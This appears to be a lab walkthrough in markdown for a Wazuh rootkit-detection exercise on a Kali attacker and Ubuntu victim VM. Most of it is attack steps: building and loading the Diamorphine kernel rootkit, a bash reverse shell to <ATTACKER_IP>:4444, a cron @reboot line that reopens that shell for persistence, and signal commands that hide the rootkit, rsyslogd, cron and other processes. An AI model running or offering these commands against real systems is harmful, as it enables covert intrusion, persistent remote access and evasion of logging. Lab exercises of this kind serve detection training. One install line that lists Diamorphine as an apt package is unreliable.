
# Environment Setup

## Virtual Machines
```bash
    ### Attacker Machine
    - Kali Linux

    ### Victim Machine
    - Ubuntu Linux
```
### Monitoring Machine
- Wazuh Server installed on the Attacker's Machine
- Wazuh Agent installed on the Victim's Machine
- Connect the Ubuntu endpoint to the Wazuh server
  
  _use official Wazuh documentation to install the Wazuh Server & Agent_

---

# Phase 1 - Installing Required Packages

## Victim Machine

```bash
sudo apt update
sudo apt install gcc git make Diamorphine
```
 _Next, configure frequent rootcheck scans by accessing:_
 
```bash
nano /var/ossec/etc/ossec.conf

```

_change the frequency to detection to every 2 mins and restart the wazuh agent_
```
<frequency>120</frequency>
sudo systemctl restart wazuh-agent
```
# Installing Diamorphine
```bash
git clone https://github.com/m0nad/Diamorphine
cd Diamorphine
make
sudo insmod diamorphine.ko
```

verify module loading
```bash
lsmod | grep diamorphine
```

# On Victim's machine establish reverse shell connection
```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```


## Phase 2 — Persistence
Cron Job Persistence
```bash
crontab -e
@reboot bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

# Phase 3 — Defense Evasion
Hiding the Rootkit (Diamorphine kernel module)
```bash
kill -63 1
```

## Hiding Processes
  Hide rsyslogd
  ```bash
  ps aux | grep rsyslogd
  kill -31 <PID>
  ```

  Hide cron 
  ```bash
  ps aux | grep cron
  kill -31 <PID>
  ```

Hide Custom Process
```bash
./test_process.sh &
kill -31 <PID>
```

